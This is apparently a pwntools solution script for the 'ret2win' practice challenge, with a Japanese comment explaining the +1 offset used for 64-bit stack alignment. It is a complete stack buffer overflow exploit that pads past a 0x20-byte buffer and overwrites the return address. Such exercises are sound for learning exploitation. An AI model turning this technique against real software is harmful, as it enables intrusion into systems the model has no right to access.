"""
64bit

rbp-0x20 <= buffer
0x32
"""

from pwn import *

elf = ELF("./ret2win")
p = process("./ret2win")
#p = remote("localhost", 7777 )

payload = b''
payload += b'A' * 0x20
payload += b'BBBBBBBB'
payload += p64( elf.symbols["ret2win"] + 1 )  #+1することでpush命令を回避して，64bit特有のアライメント（16byteの境界問題）を回避する

p.recvuntil("> ")
p.sendline( payload )
p.recv()
print(p.recv())
